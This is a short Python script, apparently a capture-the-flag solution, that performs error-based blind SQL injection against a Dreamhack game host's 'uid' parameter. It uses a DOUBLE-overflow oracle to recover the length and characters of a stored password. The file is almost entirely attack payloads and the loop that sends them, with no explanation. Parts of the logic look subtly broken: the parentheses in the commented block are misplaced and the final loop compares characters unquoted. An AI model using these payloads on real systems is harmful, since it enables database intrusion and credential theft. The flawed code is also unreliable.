from requests import get
host = "http://host3.dreamhack.games:21066/"

password_length = 0
while True:
    password_length += 1
    query = f"1' or if(char_length(upw) = {password_length},9e307*2, 1)-- -"
    r = get(f"{host}/?uid={query}")
    if "DOUBLE" in r.text:
        break
print(f"password length: {password_length}")

# password = ""
# for i in range(1, password_length + 1):
#     bit_length = 0
#     while True:
#         bit_length += 1
#         query = f"a' or if(length(bin(ord(substr(upw, {i}, 1)))),9e307*2, 1) = {bit_length}-- -"
#         r = get(f"{host}/?uid={query}")
#         if "DOUBLE" in r.text:
#             break
#     print(f"character {i}'s bit length: {bit_length}")
    
#     bits = ""
#     for j in range(1, bit_length + 1):
#         query = f"a' or if(substr(bin(ord(substr(upw, {i}, 1))),9e307*2,1), {j}, 1) = '1'-- -"
#         r = get(f"{host}/?uid={query}")
#         if "DOUBLE" in r.text:
#             bits += "1"
#         else:
#             bits += "0"
#     print(f"character {i}'s bits: {bits}")
#     password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
# print(password)
password = ""
for j in range(1, password_length+1):
    for i in range(48, 122):
        query = f"a' or if(substr(upw,{j},1)={chr(i)},9e307*2, 0)-- -"
        r = get(f"{host}/?uid={query}")
        if "DOUBLE" in r.text:
            print(f"password : {chr(i)}")
            break